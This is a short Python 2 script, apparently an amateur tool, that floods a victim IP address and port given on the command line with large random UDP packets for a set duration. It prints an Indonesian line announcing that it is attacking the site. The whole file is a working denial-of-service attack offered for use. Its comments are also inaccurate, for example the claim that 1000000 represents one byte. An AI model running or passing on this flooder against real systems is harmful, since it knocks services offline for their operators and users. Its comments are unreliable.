
import time
import socket
import random
import sys

def usage():
    print "SUBSCRIBE : Nabil Dinandri"
    print "MADE BY : MOSTOAS"
    print "AUTHOR : MOSTOAS"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1000000 representes one byte to the server
    bytes = random._urandom(1000000)
    timeout =  time.time() + duration
    sent = 1000000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Sedang Menyerang situs %s mengirim paket hacking %s di port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

